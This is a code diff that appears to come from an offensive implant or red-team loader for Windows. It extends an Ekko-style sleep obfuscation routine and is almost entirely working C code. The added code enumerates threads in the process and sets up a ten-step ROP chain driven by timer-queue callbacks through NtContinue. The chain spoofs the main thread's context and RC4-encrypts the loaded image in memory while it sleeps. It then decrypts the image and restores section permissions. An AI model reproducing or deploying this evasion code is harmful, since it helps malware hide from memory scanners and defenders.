@@ -1,4 +1,4 @@
-#include <windows.h>
+#include "hooks.h"
 #include "tcg.h"
 
 #ifndef NTSTATUS
@@ -6,23 +6,43 @@ typedef LONG NTSTATUS;
 #endif
 
 #define NtCurrentProcess()  ((HANDLE)(LONG_PTR)-1)
+#define NtCurrentThread()    ( (HANDLE) (LONG_PTR)-2 )
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+#define U_PTR( x )  ((ULONG_PTR)(x))
 
 /* ── Win32 imports (Crystal Palace MODULE$Function convention) ── */
 DECLSPEC_IMPORT DWORD   KERNEL32$WaitForSingleObject(HANDLE, DWORD);
+DECLSPEC_IMPORT DWORD   KERNEL32$WaitForSingleObjectEx(HANDLE, DWORD, BOOL);
 DECLSPEC_IMPORT HANDLE  KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
 DECLSPEC_IMPORT HANDLE  KERNEL32$CreateTimerQueue(VOID);
 DECLSPEC_IMPORT BOOL    KERNEL32$CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
 DECLSPEC_IMPORT BOOL    KERNEL32$DeleteTimerQueue(HANDLE);
+DECLSPEC_IMPORT LPVOID  KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
+DECLSPEC_IMPORT BOOL    KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
 DECLSPEC_IMPORT BOOL    KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
 DECLSPEC_IMPORT BOOL    KERNEL32$SetEvent(HANDLE);
 DECLSPEC_IMPORT HMODULE KERNEL32$GetModuleHandleA(LPCSTR);
 DECLSPEC_IMPORT HMODULE KERNEL32$LoadLibraryA(LPCSTR);
 DECLSPEC_IMPORT FARPROC KERNEL32$GetProcAddress(HMODULE, LPCSTR);
 DECLSPEC_IMPORT BOOL    KERNEL32$FlushInstructionCache(HANDLE, LPCVOID, SIZE_T);
+DECLSPEC_IMPORT DWORD   KERNEL32$GetCurrentProcessId(VOID);
+DECLSPEC_IMPORT DWORD   KERNEL32$GetCurrentThreadId(VOID);
+DECLSPEC_IMPORT DWORD   KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT HANDLE  KERNEL32$OpenThread(DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT BOOL    KERNEL32$GetThreadContext(HANDLE, LPCONTEXT);
+DECLSPEC_IMPORT BOOL    KERNEL32$SetThreadContext(HANDLE, const CONTEXT *);
+DECLSPEC_IMPORT BOOL    KERNEL32$CloseHandle(HANDLE);
+
 DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char *, ...);
 DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);
 DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);
 
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength
+);
 // MessageBoxA is used in the hooks to demonstrate that the hooks are working, and to show the output of the GetVersions callback
 // DECLSPEC_IMPORT int WINAPI USER32$MessageBoxA ( HWND, LPCSTR, LPCSTR, UINT );
 
@@ -94,46 +114,135 @@ static void restore_section_permissions(void)
 
 }
 
+ULONG RndThreadId(ULONG CurrentThreadId) { 
+    PVOID pBuffer = NULL;
+    PSYSTEM_PROCESS_INFORMATION pCurrentProc = NULL;
+    ULONG RandomThreadId = 0;
+    ULONG ReturnLength = 0;
+    ULONG TargetPid = (ULONG)KERNEL32$GetCurrentProcessId();
+
+    // 1. Get the required size
+    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
+    if (status != STATUS_INFO_LENGTH_MISMATCH) return CurrentThreadId;
+
+    // 2. Allocate and keep the base pointer for VirtualFree later
+    pBuffer = KERNEL32$VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pBuffer) return CurrentThreadId;
+
+    status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, pBuffer, ReturnLength, &ReturnLength);
+    if (status != 0) {
+        KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
+        return CurrentThreadId;
+    }
+
+    pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
+
+    // 3. Iterate through processes
+    while (TRUE) {
+        if ((ULONG_PTR)pCurrentProc->UniqueProcessId == (ULONG_PTR)TargetPid) {
+            // Found our process, now look at its threads
+            for (ULONG i = 0; i < pCurrentProc->NumberOfThreads; i++) {
+                // Threads are located immediately after the process structure
+                PSYSTEM_THREAD_INFORMATION pThread = &pCurrentProc->Threads[i];
+                ULONG Tid = (ULONG)(ULONG_PTR)pThread->ClientId.UniqueThread;
+
+                if (Tid != CurrentThreadId) {
+                    RandomThreadId = Tid;
+                    break; // Found one!
+                }
+            }
+            break; 
+        }
+
+        if (pCurrentProc->NextEntryOffset == 0) break;
+        
+        // Move to the next process entry using the offset from the START of the current entry
+        pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCurrentProc + pCurrentProc->NextEntryOffset);
+    }
+
+    // 4. Always free using the ORIGINAL base pointer
+    KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
+
+    return (RandomThreadId != 0) ? RandomThreadId : CurrentThreadId;
+}
+
 /*
  * EkkoObf — Ekko-style sleep obfuscation via timer queue ROP chain
  *
- * 1. VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE)
- * 2. SystemFunction032(Image, Key)  — RC4 encrypt in-place
- * 3. WaitForSingleObject(CurrentProcess, SleepTime)  — actual sleep
- * 4. SystemFunction032(Image, Key)  — RC4 decrypt
- * 5. restore_section_permissions()  — fix per-section protections
- * 6. SetEvent(hEvent)  — signal completion
+ * Flow (mirrors Kharon Timer pattern):
+ *   Timer 0: RtlCaptureContext(&CtxThread) — capture timer-thread context
+ *   Timer 1: SetEvent(hEvtCapture)         — signal capture is done
+ *   Main:    WaitForSingleObject(hEvtCapture) — guaranteed capture
  *
- * Each step is a CONTEXT struct dispatched via NtContinue from a timer queue.
+ * ROP chain (all via NtContinue, staggered timers):
+ *   ROP 0:  WaitForSingleObject(hEvtStart) — gate: block timer thread until main is ready
+ *   ROP 1:  GetThreadContext(MainThread, &CtxBkp)   — backup main thread context
+ *   ROP 2:  SetThreadContext(MainThread, &CtxSpf)   — spoof with random thread's context
+ *   ROP 3:  VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE)
+ *   ROP 4:  SystemFunction032(Image, Key)           — RC4 encrypt in-place
+ *   ROP 5:  WaitForSingleObject(CurrentProcess, SleepTime) — actual sleep
+ *   ROP 6:  SystemFunction032(Image, Key)           — RC4 decrypt
+ *   ROP 7:  VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READ)
+ *   ROP 8:  SetThreadContext(MainThread, &CtxBkp)   — restore original context
+ *   ROP 9:  SetEvent(hEvtEnd)                       — signal completion
+ *
+ * Main:     SetEvent(hEvtStart) + WaitForSingleObject(hEvtEnd) — trigger & wait
  */
 VOID EkkoObf(DWORD SleepTime)
 {
+    ULONG  CurrentThreadId = KERNEL32$GetCurrentThreadId();
+    ULONG  RandomThreadId  = RndThreadId(CurrentThreadId);
+
+    MSVCRT$printf("[ekko] CurrentThreadId=%lu RandomThreadId=%lu\n", CurrentThreadId, RandomThreadId);
+
+    HANDLE DupThreadHandle  = NULL;
+    HANDLE MainThreadHandle = NULL;
+
+    /* 11 contexts: captured + 10 ROP frames */
     CONTEXT CtxThread;
+    CONTEXT RopWait;
+    CONTEXT RopGetCtx;
+    CONTEXT RopSetSpf;
     CONTEXT RopProtRW;
     CONTEXT RopMemEnc;
     CONTEXT RopDelay;
     CONTEXT RopMemDec;
-    CONTEXT RopFixSec;
+    CONTEXT RopProtRX;
+    CONTEXT RopRstCtx;
     CONTEXT RopSetEvt;
 
+    CONTEXT CtxSpf;
+    CONTEXT CtxBkp;
+
     MSVCRT$memset(&CtxThread, 0, sizeof(CONTEXT));
+    MSVCRT$memset(&RopWait,   0, sizeof(CONTEXT));
+    MSVCRT$memset(&RopGetCtx, 0, sizeof(CONTEXT));
+    MSVCRT$memset(&RopSetSpf, 0, sizeof(CONTEXT));
     MSVCRT$memset(&RopProtRW, 0, sizeof(CONTEXT));
     MSVCRT$memset(&RopMemEnc, 0, sizeof(CONTEXT));
     MSVCRT$memset(&RopDelay,  0, sizeof(CONTEXT));
     MSVCRT$memset(&RopMemDec, 0, sizeof(CONTEXT));
-    MSVCRT$memset(&RopFixSec, 0, sizeof(CONTEXT));
+    MSVCRT$memset(&RopProtRX, 0, sizeof(CONTEXT));
+    MSVCRT$memset(&RopRstCtx, 0, sizeof(CONTEXT));
     MSVCRT$memset(&RopSetEvt, 0, sizeof(CONTEXT));
+
+    MSVCRT$memset(&CtxSpf, 0, sizeof(CONTEXT));
+    MSVCRT$memset(&CtxBkp, 0, sizeof(CONTEXT));
 
     HANDLE  hTimerQueue = NULL;
     HANDLE  hNewTimer   = NULL;
-    HANDLE  hEvent      = NULL;
+    HANDLE  hEvtCapture = NULL;   /* manual-reset: context capture sync    */
+    HANDLE  hEvtStart   = NULL;   /* manual-reset: gate for ROP chain      */
+    HANDLE  hEvtEnd     = NULL;   /* manual-reset: completion signal       */
     DWORD   OldProtect  = 0;
+    DWORD   DelayTimer  = 0;
 
-    /* RC4 key — can be randomised per-sleep */
+    /* RC4 key */
     CHAR    KeyBuf[16];
     MSVCRT$memset(KeyBuf, 0x55, 16);
     USTRING Key;
-    USTRING Img;
+    USTRING Img ;
+
     MSVCRT$memset(&Key, 0, sizeof(USTRING));
     MSVCRT$memset(&Img, 0, sizeof(USTRING));
 
@@ -143,9 +252,9 @@ VOID EkkoObf(DWORD SleepTime)
         return;
     }
 
-    /* resolve NtContinue, RtlCaptureContext, SystemFunction032 */
-    HMODULE hNtdll   = KERNEL32$GetModuleHandleA("ntdll");
-    HMODULE hAdvapi  = KERNEL32$LoadLibraryA("Advapi32");
+    /* ── resolve NtContinue, RtlCaptureContext, SystemFunction032 ── */
+    HMODULE hNtdll  = KERNEL32$GetModuleHandleA("ntdll");
+    HMODULE hAdvapi = KERNEL32$LoadLibraryA("Advapi32");
 
     if (!hNtdll || !hAdvapi) {
         MSVCRT$printf("[ekko] ERROR: failed to load ntdll/advapi32\n");
@@ -153,9 +262,9 @@ VOID EkkoObf(DWORD SleepTime)
         return;
     }
 
-    fnNtContinue        pNtContinue        = (fnNtContinue)       KERNEL32$GetProcAddress(hNtdll,  "NtContinue");
-    fnRtlCaptureContext pRtlCaptureContext  = (fnRtlCaptureContext)KERNEL32$GetProcAddress(hNtdll,  "RtlCaptureContext");
-    fnSystemFunction032 pSysFunc032         = (fnSystemFunction032)KERNEL32$GetProcAddress(hAdvapi, "SystemFunction032");
+    fnNtContinue        pNtContinue       = (fnNtContinue)       KERNEL32$GetProcAddress(hNtdll,  "NtContinue");
+    fnRtlCaptureContext pRtlCaptureContext = (fnRtlCaptureContext)KERNEL32$GetProcAddress(hNtdll,  "RtlCaptureContext");
+    fnSystemFunction032 pSysFunc032        = (fnSystemFunction032)KERNEL32$GetProcAddress(hAdvapi, "SystemFunction032");
 
     if (!pNtContinue || !pRtlCaptureContext || !pSysFunc032) {
         MSVCRT$printf("[ekko] ERROR: failed to resolve functions\n");
@@ -164,91 +273,186 @@ VOID EkkoObf(DWORD SleepTime)
     }
 
     MSVCRT$printf("[ekko] ImageBase=%p Size=0x%lx SleepTime=%lu ms\n", g_ImageBase, g_ImageSize, SleepTime);
+    MSVCRT$printf("[ekko] current tid=%lu  spoof tid=%lu\n", CurrentThreadId, RandomThreadId);
 
-    /* setup USTRING for SystemFunction032 */
+    /* ── setup USTRING for SystemFunction032 ── */
     Key.Buffer = KeyBuf;
     Key.Length  = Key.MaximumLength = 16;
-
     Img.Buffer = g_ImageBase;
     Img.Length  = Img.MaximumLength = g_ImageSize;
 
-    hEvent      = KERNEL32$CreateEventW(0, 0, 0, 0);
-    hTimerQueue = KERNEL32$CreateTimerQueue();
+    /* ── open the random thread for context spoofing ── */
+    DupThreadHandle = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, RandomThreadId);
+    if (!DupThreadHandle) {
+        MSVCRT$printf("[ekko] WARN: OpenThread(%lu) failed, skipping thread spoof\n", RandomThreadId);
+    } else {
+        MSVCRT$printf("[ekko] DupThreadHandle=%p (tid %lu)\n", DupThreadHandle, RandomThreadId);
+    }
 
-    if (!hEvent || !hTimerQueue) {
-        MSVCRT$printf("[ekko] ERROR: failed to create event/timer queue\n");
+    /* ── duplicate current thread handle ── */
+    KERNEL32$DuplicateHandle(NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(),
+                             &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0);
+    if (!MainThreadHandle) {
+        MSVCRT$printf("[ekko] ERROR: DuplicateHandle for main thread failed\n");
+        if (DupThreadHandle) KERNEL32$CloseHandle(DupThreadHandle);
         KERNEL32$WaitForSingleObject(NtCurrentProcess(), SleepTime);
         return;
     }
+    MSVCRT$printf("[ekko] MainThreadHandle=%p\n", MainThreadHandle);
 
-    /* step 0: capture the current thread context via a timer callback */
-    if (KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
-            (WAITORTIMERCALLBACK)pRtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
-    {
-        KERNEL32$WaitForSingleObject(hEvent, 0x32); /* brief wait for context capture */
+    /* ── create 3 manual-reset events (like Kharon EventTimer/EventStart/EventEnd) ── */
+    hEvtCapture = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
+    hEvtStart   = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
+    hEvtEnd     = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
+    hTimerQueue = KERNEL32$CreateTimerQueue();
 
-        /* clone captured context into each ROP frame */
-        MSVCRT$memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
-        MSVCRT$memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
-        MSVCRT$memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
-        MSVCRT$memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
-        MSVCRT$memcpy(&RopFixSec, &CtxThread, sizeof(CONTEXT));
-        MSVCRT$memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));
+    if (!hEvtCapture || !hEvtStart || !hEvtEnd || !hTimerQueue) {
+        MSVCRT$printf("[ekko] ERROR: failed to create events/timer queue\n");
+        if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
+        if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
+        if (hEvtCapture) KERNEL32$CloseHandle(hEvtCapture);
+        if (hEvtStart)   KERNEL32$CloseHandle(hEvtStart);
+        if (hEvtEnd)     KERNEL32$CloseHandle(hEvtEnd);
+        KERNEL32$WaitForSingleObject(NtCurrentProcess(), SleepTime);
+        return;
+    }
+    MSVCRT$printf("[ekko] events and timer queue created\n");
 
-        /* ── ROP 1: VirtualProtect → PAGE_READWRITE ── */
-        RopProtRW.Rsp -= 8;
-        RopProtRW.Rip  = (DWORD64)KERNEL32$VirtualProtect;
-        RopProtRW.Rcx  = (DWORD64)g_ImageBase;
-        RopProtRW.Rdx  = (DWORD64)g_ImageSize;
-        RopProtRW.R8   = PAGE_READWRITE;
-        RopProtRW.R9   = (DWORD64)&OldProtect;
+    /* ── capture spoof thread context ── */
+    CtxSpf.ContextFlags = CONTEXT_ALL;
+    CtxBkp.ContextFlags = CONTEXT_ALL;
 
-        /* ── ROP 2: SystemFunction032 → encrypt ── */
-        RopMemEnc.Rsp -= 8;
-        RopMemEnc.Rip  = (DWORD64)pSysFunc032;
-        RopMemEnc.Rcx  = (DWORD64)&Img;
-        RopMemEnc.Rdx  = (DWORD64)&Key;
-
-        /* ── ROP 3: WaitForSingleObject → sleep ── */
-        RopDelay.Rsp  -= 8;
-        RopDelay.Rip   = (DWORD64)KERNEL32$WaitForSingleObject;
-        RopDelay.Rcx   = (DWORD64)NtCurrentProcess();
-        RopDelay.Rdx   = (DWORD64)SleepTime;
-
-        /* ── ROP 4: SystemFunction032 → decrypt ── */
-        RopMemDec.Rsp -= 8;
-        RopMemDec.Rip  = (DWORD64)pSysFunc032;
-        RopMemDec.Rcx  = (DWORD64)&Img;
-        RopMemDec.Rdx  = (DWORD64)&Key;
-
-        /* ── ROP 5: restore_section_permissions → fix per-section protections ── */
-        RopFixSec.Rsp -= 8;
-        RopFixSec.Rip  = (DWORD64)restore_section_permissions;
-
-        /* ── ROP 6: SetEvent → signal done ── */
-        RopSetEvt.Rsp -= 8;
-        RopSetEvt.Rip  = (DWORD64)KERNEL32$SetEvent;
-        RopSetEvt.Rcx  = (DWORD64)hEvent;
-
-        MSVCRT$printf("[ekko] queuing ROP chain timers...\n");
-
-        /* queue each context frame via NtContinue, staggered 100ms apart */
-        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
-        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
-        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);
-        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
-        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopFixSec, 500, 0, WT_EXECUTEINTIMERTHREAD);
-        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);
-
-        MSVCRT$printf("[ekko] waiting for obfuscation chain to complete...\n");
-
-        /* block until the ROP chain signals completion */
-        KERNEL32$WaitForSingleObject(hEvent, INFINITE);
-
-        MSVCRT$printf("[ekko] sleep obfuscation complete, DLL decrypted and sections restored\n");
+    if (DupThreadHandle) {
+        BOOL ok = KERNEL32$GetThreadContext(DupThreadHandle, &CtxSpf);
+        MSVCRT$printf("[ekko] GetThreadContext(spoof) = %d  Rip=%p Rsp=%p\n", ok, (PVOID)CtxSpf.Rip, (PVOID)CtxSpf.Rsp);
     }
 
+    /* ── step 0: capture timer-thread context via two timed callbacks ── */
+    /*    Timer A: RtlCaptureContext(&CtxThread)                         */
+    /*    Timer B: SetEvent(hEvtCapture) — signals capture is complete   */
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
+        (WAITORTIMERCALLBACK)pRtlCaptureContext, &CtxThread, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
+        (WAITORTIMERCALLBACK)KERNEL32$SetEvent, hEvtCapture, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+
+    MSVCRT$printf("[ekko] waiting for timer-thread context capture...\n");
+    KERNEL32$WaitForSingleObject(hEvtCapture, INFINITE);
+    MSVCRT$printf("[ekko] timer-thread context captured: Rip=%p Rsp=%p\n", (PVOID)CtxThread.Rip, (PVOID)CtxThread.Rsp);
+
+    /* ── clone captured context into every ROP frame ── */
+    MSVCRT$memcpy(&RopWait,   &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopGetCtx, &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopSetSpf, &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopRstCtx, &CtxThread, sizeof(CONTEXT));
+    MSVCRT$memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));
+
+    /* adjust stack for each frame (simulate CALL push of return address) */
+    RopWait.Rsp   -= 8;
+    RopGetCtx.Rsp -= 8;
+    RopSetSpf.Rsp -= 8;
+    RopProtRW.Rsp -= 8;
+    RopMemEnc.Rsp -= 8;
+    RopDelay.Rsp  -= 8;
+    RopMemDec.Rsp -= 8;
+    RopProtRX.Rsp -= 8;
+    RopRstCtx.Rsp -= 8;
+    RopSetEvt.Rsp -= 8;
+
+    /* ── ROP 0: WaitForSingleObject(hEvtStart, INFINITE) — gate ── */
+    RopWait.Rip = (DWORD64)KERNEL32$WaitForSingleObject;
+    RopWait.Rcx = (DWORD64)hEvtStart;
+    RopWait.Rdx = (DWORD64)INFINITE;
+
+    /* ── ROP 1: GetThreadContext(MainThread, &CtxBkp) — backup ── */
+    RopGetCtx.Rip = (DWORD64)KERNEL32$GetThreadContext;
+    RopGetCtx.Rcx = (DWORD64)MainThreadHandle;
+    RopGetCtx.Rdx = (DWORD64)&CtxBkp;
+
+    /* ── ROP 2: SetThreadContext(MainThread, &CtxSpf) — spoof ── */
+    RopSetSpf.Rip = (DWORD64)KERNEL32$SetThreadContext;
+    RopSetSpf.Rcx = (DWORD64)MainThreadHandle;
+    RopSetSpf.Rdx = (DWORD64)&CtxSpf;
+
+    /* ── ROP 3: VirtualProtect → PAGE_READWRITE ── */
+    RopProtRW.Rip = (DWORD64)KERNEL32$VirtualProtect;
+    RopProtRW.Rcx = (DWORD64)g_ImageBase;
+    RopProtRW.Rdx = (DWORD64)g_ImageSize;
+    RopProtRW.R8  = PAGE_READWRITE;
+    RopProtRW.R9  = (DWORD64)&OldProtect;
+
+    /* ── ROP 4: SystemFunction032 → encrypt ── */
+    RopMemEnc.Rip = (DWORD64)pSysFunc032;
+    RopMemEnc.Rcx = (DWORD64)&Img;
+    RopMemEnc.Rdx = (DWORD64)&Key;
+
+    /* ── ROP 5: WaitForSingleObject → sleep ── */
+    RopDelay.Rip = (DWORD64)KERNEL32$WaitForSingleObject;
+    RopDelay.Rcx = (DWORD64)NtCurrentProcess();
+    RopDelay.Rdx = (DWORD64)SleepTime;
+
+    /* ── ROP 6: SystemFunction032 → decrypt ── */
+    RopMemDec.Rip = (DWORD64)pSysFunc032;
+    RopMemDec.Rcx = (DWORD64)&Img;
+    RopMemDec.Rdx = (DWORD64)&Key;
+
+    // /* ── ROP 7: VirtualProtect → PAGE_EXECUTE_READ ── */
+    // RopProtRX.Rip = (DWORD64)KERNEL32$VirtualProtect;
+    // RopProtRX.Rcx = (DWORD64)g_ImageBase;
+    // RopProtRX.Rdx = (DWORD64)g_ImageSize;
+    // RopProtRX.R8  = PAGE_EXECUTE_READ;
+    // RopProtRX.R9  = (DWORD64)&OldProtect;
+    /* ── ROP 7: restore_section_permissions ── */
+    RopProtRX.Rip = (DWORD64)restore_section_permissions;
+
+    /* ── ROP 8: SetThreadContext(MainThread, &CtxBkp) — restore ── */
+    RopRstCtx.Rip = (DWORD64)KERNEL32$SetThreadContext;
+    RopRstCtx.Rcx = (DWORD64)MainThreadHandle;
+    RopRstCtx.Rdx = (DWORD64)&CtxBkp;
+
+    /* ── ROP 9: SetEvent(hEvtEnd) — signal done ── */
+    RopSetEvt.Rip = (DWORD64)KERNEL32$SetEvent;
+    RopSetEvt.Rcx = (DWORD64)hEvtEnd;
+
+    MSVCRT$printf("[ekko] queuing ROP chain (10 steps)...\n");
+
+    /* queue each context frame via NtContinue, staggered 100ms apart */
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopWait,   DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopGetCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetSpf, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRW, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemEnc, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopDelay,  DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemDec, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRX, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopRstCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetEvt, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+
+    MSVCRT$printf("[ekko] all timers queued (total delay=%lu ms). triggering gate...\n", DelayTimer);
+
+    /* ── trigger: signal the gate, then wait for completion ── */
+    KERNEL32$SetEvent(hEvtStart);
+    MSVCRT$printf("[ekko] gate signaled, waiting for ROP chain to complete...\n");
+    KERNEL32$WaitForSingleObject(hEvtEnd, INFINITE);
+
+    MSVCRT$printf("[ekko] sleep obfuscation complete\n");
+
+    // /* ── restore section permissions (done outside ROP so we can log) ── */
+    // restore_section_permissions();
+    // MSVCRT$printf("[ekko] section permissions restored\n");
+
+    /* ── cleanup ── */
+    if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
+    if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
+    KERNEL32$CloseHandle(hEvtCapture);
+    KERNEL32$CloseHandle(hEvtStart);
+    KERNEL32$CloseHandle(hEvtEnd);
     KERNEL32$DeleteTimerQueue(hTimerQueue);
+    MSVCRT$printf("[ekko] cleanup done\n");
 }
 
 /*
@@ -260,5 +464,5 @@ VOID _Sleep(DWORD dwMilliseconds) {
     
     EkkoObf(dwMilliseconds);
     
-    // KERNEL32$WaitForSingleObject(NtCurrentProcess(), dwMilliseconds);
+    //KERNEL32$WaitForSingleObject(NtCurrentProcess(), 2000); /* small delay to ensure log is flushed before obfuscation starts */
 }
